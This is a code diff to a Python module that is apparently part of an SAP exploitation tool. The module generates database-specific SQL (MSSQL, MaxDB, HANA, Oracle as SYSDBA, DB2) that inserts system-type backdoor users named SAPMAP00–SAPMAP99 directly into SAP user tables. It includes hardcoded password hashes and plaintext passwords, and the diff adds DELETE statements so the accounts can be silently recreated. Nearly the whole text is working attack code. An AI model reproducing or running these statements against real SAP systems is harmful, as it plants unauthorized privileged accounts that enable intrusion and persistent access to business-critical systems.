@@ -13,13 +13,12 @@ into pure Python templates usable by the exploitation engine.
 SAPMAP_USER_PREFIX = "SAPMAP"
 SAPMAP_USER_MAX = 99   # SAPMAP00 .. SAPMAP99
 
-# Pre-generated password hashes (same as GO_IN in the .bat file)
-# Password for ABAP logon: "andinyougo"
-# Password for Java logon:  "Andinyoug0"
+# Pre-generated password hashes for user SAPMAP00 with password "andinyougo"
+# Note: SAP hashes are username-dependent — these are ONLY valid for SAPMAP00.
 SAPMAP_PASSWORD_ABAP = "andinyougo"
 SAPMAP_PASSWORD_JAVA = "Andinyoug0"
-BCODE_HEX = "C76AB3A59599FE3A"
-PASSCODE_HEX = "CF017A9A4F1F53ED69CEDC773072B1B24A063A63"
+BCODE_HEX = "3E6632FB15070BA1"
+PASSCODE_HEX = "1C6BB7A000D12A1F250D58C3B5A1674D0A716D19"
 
 # User type S = System / Service user (no dialog logon restrictions apply)
 USER_TYPE = "S"
@@ -35,14 +34,33 @@ def sapmap_username(index: int) -> str:
 # SQL templates per database type
 # ---------------------------------------------------------------------------
 # Each template set returns a list of SQL statements.
-# Placeholders: {sid}, {client}, {username}, {bcode}, {passcode}
+# Every generator first DELETEs the user if it already exists, then INSERTs.
+
+
+def _cleanup_sql(client: str, username: str) -> list:
+    """DELETE statements to remove a user before re-creating it."""
+    return [
+        f"DELETE FROM USRBF2 WHERE MANDT='{client}' AND BNAME='{username}'",
+        f"DELETE FROM USR04 WHERE MANDT='{client}' AND BNAME='{username}'",
+        f"DELETE FROM UST04 WHERE MANDT='{client}' AND BNAME='{username}'",
+        f"DELETE FROM USREFUS WHERE MANDT='{client}' AND BNAME='{username}'",
+        f"DELETE FROM USR02 WHERE MANDT='{client}' AND BNAME='{username}'",
+    ]
 
 def sql_mssql_abap(sid: str, client: str, username: str) -> list:
     """MSSQL ABAP stack — T-SQL statements."""
     SID = sid.upper()
+    # Cleanup first, then create
+    cleanup = []
+    for tbl in ["USRBF2", "USR04", "UST04", "USREFUS", "USR02"]:
+        cleanup += [
+            f"DELETE FROM {SID}.{tbl} WHERE MANDT='{client}' AND BNAME='{username}'",
+            "GO",
+        ]
     return [
         f"USE {SID}",
         "GO",
+    ] + cleanup + [
         f"INSERT INTO {SID}.USR02 (MANDT,BNAME,USTYP,CODVN) "
         f"VALUES ('{client}','{username}','{USER_TYPE}','{CODVN}')",
         "GO",
@@ -106,7 +124,7 @@ def sql_mssql_java(sid: str, client: str, username: str) -> list:
 
 def sql_maxdb(sid: str, client: str, username: str) -> list:
     """MaxDB — sqlcli statements."""
-    return [
+    return _cleanup_sql(client, username) + [
         f"INSERT INTO USR02 (MANDT,BNAME,BCODE,USTYP,CODVN) "
         f"VALUES ('{client}','{username}','{BCODE_HEX}','{USER_TYPE}','{CODVN}')",
         f"UPDATE USR02 SET PASSCODE='{PASSCODE_HEX}' "
@@ -131,7 +149,7 @@ def sql_maxdb(sid: str, client: str, username: str) -> list:
 
 def sql_hana(sid: str, client: str, username: str) -> list:
     """HANA DB — hdbsql statements (no schema prefix, -U DEFAULT sets it)."""
-    return [
+    return _cleanup_sql(client, username) + [
         f"INSERT INTO USR02 (MANDT,BNAME,USTYP,CODVN) "
         f"VALUES ('{client}','{username}','{USER_TYPE}','{CODVN}')",
         f"UPDATE USR02 SET BCODE='{BCODE_HEX}' "
@@ -147,8 +165,9 @@ def sql_hana(sid: str, client: str, username: str) -> list:
 
 def sql_oracle(sid: str, client: str, username: str) -> list:
     """Oracle — sqlplus statements (SAPSR3 schema, sysdba auth)."""
-    return [
-        "CONNECT / AS SYSDBA;",
+    cleanup = [f"DELETE FROM SAPSR3.{t} WHERE MANDT='{client}' AND BNAME='{username}';"
+               for t in ("USRBF2", "USR04", "UST04", "USREFUS", "USR02")]
+    return ["CONNECT / AS SYSDBA;"] + cleanup + [
         f"INSERT INTO SAPSR3.USR02 (MANDT,BNAME,BCODE,USTYP,CODVN) "
         f"VALUES ('{client}','{username}','{BCODE_HEX}','{USER_TYPE}','{CODVN}');",
         f"UPDATE SAPSR3.USR02 SET PASSCODE='{PASSCODE_HEX}' "
@@ -160,7 +179,7 @@ def sql_oracle(sid: str, client: str, username: str) -> list:
 
 def sql_db2(sid: str, client: str, username: str) -> list:
     """DB2 — db2 CLI statements."""
-    return [
+    return _cleanup_sql(client, username) + [
         f"INSERT INTO USR02 (MANDT,BNAME,BCODE,USTYP,CODVN) "
         f"VALUES ('{client}','{username}','{BCODE_HEX}','{USER_TYPE}','{CODVN}')",
         f"UPDATE USR02 SET PASSCODE='{PASSCODE_HEX}' "
